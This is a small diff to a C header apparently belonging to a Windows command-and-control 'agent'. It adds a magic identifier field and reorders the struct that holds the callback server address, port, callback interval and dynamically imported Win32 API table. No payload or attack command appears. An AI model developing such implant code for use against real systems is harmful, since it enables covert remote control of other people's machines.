@@ -6,6 +6,8 @@
 #include "./task.h"
 
 #define AGENT_REMOTE_SERVER_MAX_LENGTH 128
+#define AGENT_MAGIC 0x4145  // EA
+
 typedef DWORD AGENT_INTERVAL;
 
 /*
@@ -22,9 +24,10 @@ TaskMapping taskMappings[] = {
  * This struct represents an agent, there is only one agent per executable.
  */
 typedef struct Agent_ {
+    DWORD _magic;                                         // the magic byte to identify the agent  (must be set to macro AGENT_MAGIC)
+    AGENT_INTERVAL _interval;                             // the interval in between server callbacks
     WCHAR _remoteServer[AGENT_REMOTE_SERVER_MAX_LENGTH];  // the server IP or URL that the agent will connect to
     INTERNET_PORT _remotePort;                            // the port for the server 
-    AGENT_INTERVAL _interval;                             // the interval in between server callbacks
     PAPI api;                                             // the api that has dynamically imported Win32 functions
 } Agent, *PAgent;
 
